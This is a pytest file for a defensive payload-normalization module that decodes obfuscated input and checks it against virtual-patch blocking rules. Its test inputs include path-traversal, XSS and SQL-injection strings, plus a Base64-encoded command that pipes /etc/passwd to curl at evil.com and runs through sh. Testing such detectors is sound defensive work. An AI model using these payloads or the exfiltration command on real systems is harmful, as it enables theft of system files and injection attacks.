"""
PREVENT-X Phase 5: Payload Normalization Tests
Validates URL, double URL, HTML entities, Unicode escapes, Hex escapes,
JSON string escapes, controlled Base64 inspection, evasion detection,
evidence preservation, recursion bomb safety, and Virtual Patch integration.
"""

import base64
import uuid
import pytest

from backend.app.models.virtual_patch import AttackType, PatchAction, PatchStatus, VirtualPatchRule
from backend.app.modules.network_defense.normalization.normalizer import (
    PayloadNormalizer,
    payload_normalizer,
)
from backend.app.modules.network_defense.normalization.service import (
    normalization_patch_service,
)


def test_url_and_double_url_decoding():
    """Verifies that URL encoding and double URL encoding are stripped iteratively."""
    normalizer = PayloadNormalizer()

    # Single URL encoding
    single_enc = "%2e%2e%2fetc%2fpasswd"
    res1 = normalizer.normalize(single_enc)
    assert res1.normalized_text == "../etc/passwd"
    assert "url_decode" in res1.detected_techniques
    assert res1.raw_text == single_enc  # Evidence preserved!

    # Double URL encoding: %252e -> %2e -> .
    double_enc = "%252e%252e%252fetc%252fpasswd"
    res2 = normalizer.normalize(double_enc)
    assert res2.normalized_text == "../etc/passwd"
    assert "url_decode_pass_2" in res2.detected_techniques
    assert res2.obfuscation_detected is True


def test_html_entity_decoding():
    """Verifies that HTML entities like &lt;, &gt;, &#x27; are unescaped."""
    normalizer = PayloadNormalizer()
    payload = "&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;"
    res = normalizer.normalize(payload)
    assert res.normalized_text == "<script>alert('XSS')</script>"
    assert "html_entity_unescape" in res.detected_techniques
    assert res.raw_text == payload


def test_unicode_and_hex_escape_decoding():
    """Verifies that \\uXXXX and \\xXX escape sequences are canonicalized."""
    normalizer = PayloadNormalizer()

    # Unicode escapes: \u0027 -> '
    uni_payload = "\\u0027 UNION SELECT 1,2,3-- -"
    res_uni = normalizer.normalize(uni_payload)
    assert res_uni.normalized_text == "' UNION SELECT 1,2,3-- -"
    assert "unicode_unescape" in res_uni.detected_techniques

    # Hex escapes: \x3c -> <, \x3e -> >
    hex_payload = "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e"
    res_hex = normalizer.normalize(hex_payload)
    assert res_hex.normalized_text == "<script>alert(1)</script>"
    assert "hex_unescape" in res_hex.detected_techniques


def test_json_escape_decoding():
    """Verifies that JSON string escapes like \\", \\/, \\n are decoded."""
    normalizer = PayloadNormalizer()
    payload = r'{\"role\": \"admin\", \"path\": \"\/admin\/dashboard\"}'
    res = normalizer.normalize(payload)
    assert '{"role": "admin"' in res.normalized_text
    assert "/admin/dashboard" in res.normalized_text
    assert "json_escape_unescape" in res.detected_techniques


def test_controlled_base64_inspection():
    """Verifies that embedded Base64 malicious payloads are extracted without mutating raw text."""
    normalizer = PayloadNormalizer()
    secret_cmd = "cat /etc/passwd | curl http://evil.com/leak"
    b64_str = base64.b64encode(secret_cmd.encode()).decode()
    payload = f"echo {b64_str} | sh"

    res = normalizer.normalize(payload)
    assert res.obfuscation_detected is True
    assert "base64_embedded_payload" in res.detected_techniques
    assert any("cat /etc/passwd" in frag for frag in res.extracted_base64_fragments)
    assert res.raw_text == payload  # Raw text remains completely intact!


def test_recursion_depth_and_safe_bounds():
    """Verifies that multi-nested encoding stops safely at max_depth without hanging."""
    normalizer = PayloadNormalizer(max_depth=3)
    # 5-layer nested URL encoding
    nested = "SELECT"
    for _ in range(5):
        nested = "".join(f"%{ord(c):02x}" for c in nested)

    res = normalizer.normalize(nested)
    # Should stop cleanly after 3 passes without hanging or stack overflow
    assert len(res.detected_techniques) <= 3


def test_virtual_patch_integration_with_obfuscation(db_session, test_tenants):
    """
    Verifies that a virtual patch rule detects an attack even if heavily obfuscated with
    URL and Unicode evasions.
    """
    org_a = test_tenants["org_a"]

    # Rule looking for SQL injection UNION SELECT
    rule = VirtualPatchRule(
        organization_id=org_a.id,
        rule_name="Block SQLi Union",
        description="Block SQLi Union Injections",
        attack_type=AttackType.SQLI.value,
        target_uri_pattern="/api/v1/search",
        match_conditions=r"\bUNION\s+SELECT\b",
        action=PatchAction.BLOCK.value,
        status=PatchStatus.PRODUCTION.value,
    )

    # Obfuscated payload: URL encoded Unicode \\u0053\\u0045\\u004c\\u0045\\u0043\\u0054
    # "UNION %5cu0053%5cu0045%5cu004c%5cu0045%5cu0043%5cu0054"
    obfuscated_payload = "UNION %5cu0053%5cu0045%5cu004c%5cu0045%5cu0043%5cu0054 1,2,3"

    blocked, matched_rule, norm_meta = normalization_patch_service.evaluate_payload_against_patch_rules(
        raw_payload=obfuscated_payload,
        rules=[rule],
    )

    assert blocked is True
    assert matched_rule.id == rule.id
    assert norm_meta.obfuscation_detected is True
    assert "UNION SELECT 1,2,3" in norm_meta.normalized_text


def test_payload_normalization_api(client, test_tenants):
    """Verifies the REST API endpoint for payload normalization."""
    admin_a = test_tenants["admin_a"]
    login_res = client.post("/api/v1/auth/login", json={"email": admin_a.email, "password": "AlphaAdminPass123!"})
    token = login_res.json()["tokens"]["access_token"]
    headers = {"Authorization": f"Bearer {token}"}

    payload = "%252e%252e%252f&lt;script&gt;\\u0027 OR 1=1"
    res = client.post(
        "/api/v1/network-defense/normalization/inspect",
        json={"payload": payload},
        headers=headers,
    )
    assert res.status_code == 200
    data = res.json()
    assert data["raw_text"] == payload
    assert "../<script>' OR 1=1" in data["normalized_text"]
    assert data["obfuscation_detected"] is True
    assert len(data["detected_techniques"]) >= 2
